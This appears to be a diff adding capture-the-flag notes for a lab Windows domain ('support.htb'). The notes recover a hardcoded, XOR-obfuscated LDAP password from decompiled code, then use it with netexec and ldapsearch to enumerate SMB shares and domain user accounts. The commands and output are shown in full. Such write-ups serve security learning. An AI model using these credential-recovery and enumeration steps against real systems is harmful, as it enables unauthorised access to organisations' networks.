@@ -1,0 +1,99 @@
+// Token: 0x04000005 RID: 5
+		private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
+
+		// Token: 0x04000006 RID: 6
+		private static byte[] key = Encoding.ASCII.GetBytes("armando");
+	
+	public static string getPassword()
+		{
+			byte[] array = Convert.FromBase64String(Protected.enc_password);
+			byte[] array2 = array;
+			for (int i = 0; i < array.Length; i++)
+			{
+				array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
+			}
+			return Encoding.Default.GetString(array2);
+
+	//from the encoded passwd, base64 deocode, xor the key , xor 223 or oxdf.
+	//do it using cyberchef
+	nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+
+	//for the user, we can get it from ldapquery, which is support\\ldap
+	public LdapQuery()
+		{
+			string password = Protected.getPassword();
+			this.entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
+			this.entry.AuthenticationType = AuthenticationTypes.Secure;
+			this.ds = new DirectorySearcher(this.entry);
+		}
+
+//test this account
+└─$ netexec smb support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'  --shares
+SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.174    445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
+SMB         10.10.11.174    445    DC               [*] Enumerated shares
+SMB         10.10.11.174    445    DC               Share           Permissions     Remark
+SMB         10.10.11.174    445    DC               -----           -----------     ------
+SMB         10.10.11.174    445    DC               ADMIN$                          Remote Admin
+SMB         10.10.11.174    445    DC               C$                              Default share
+SMB         10.10.11.174    445    DC               IPC$            READ            Remote IPC
+SMB         10.10.11.174    445    DC               NETLOGON        READ            Logon server share 
+SMB         10.10.11.174    445    DC               support-tools   READ            support staff tools
+SMB         10.10.11.174    445    DC               SYSVOL          READ            Logon server share 
+
+ldapsearch -x -H ldap://support.htb -D "ldap@support.htb" -w "nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz" -b "DC=support,DC=htb"
+
+
+# Shared Support Accounts, Users, support.htb
+dn: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
+
+# ldap, Users, support.htb
+dn: CN=ldap,CN=Users,DC=support,DC=htb
+
+# support, Users, support.htb
+dn: CN=support,CN=Users,DC=support,DC=htb
+
+# smith.rosario, Users, support.htb
+dn: CN=smith.rosario,CN=Users,DC=support,DC=htb
+
+# hernandez.stanley, Users, support.htb
+dn: CN=hernandez.stanley,CN=Users,DC=support,DC=htb
+
+# wilson.shelby, Users, support.htb
+dn: CN=wilson.shelby,CN=Users,DC=support,DC=htb
+
+# anderson.damian, Users, support.htb
+dn: CN=anderson.damian,CN=Users,DC=support,DC=htb
+
+# thomas.raphael, Users, support.htb
+dn: CN=thomas.raphael,CN=Users,DC=support,DC=htb
+
+# levine.leopoldo, Users, support.htb
+dn: CN=levine.leopoldo,CN=Users,DC=support,DC=htb
+
+# raven.clifton, Users, support.htb
+dn: CN=raven.clifton,CN=Users,DC=support,DC=htb
+
+# bardot.mary, Users, support.htb
+dn: CN=bardot.mary,CN=Users,DC=support,DC=htb
+
+# cromwell.gerard, Users, support.htb
+dn: CN=cromwell.gerard,CN=Users,DC=support,DC=htb
+
+# monroe.david, Users, support.htb
+dn: CN=monroe.david,CN=Users,DC=support,DC=htb
+
+# west.laura, Users, support.htb
+dn: CN=west.laura,CN=Users,DC=support,DC=htb
+
+# langley.lucy, Users, support.htb
+dn: CN=langley.lucy,CN=Users,DC=support,DC=htb
+
+# daughtler.mabel, Users, support.htb
+dn: CN=daughtler.mabel,CN=Users,DC=support,DC=htb
+
+# stoll.rachelle, Users, support.htb
+dn: CN=stoll.rachelle,CN=Users,DC=support,DC=htb
+
+# ford.victoria, Users, support.htb
+dn: CN=ford.victoria,CN=Users,DC=support,DC=htb
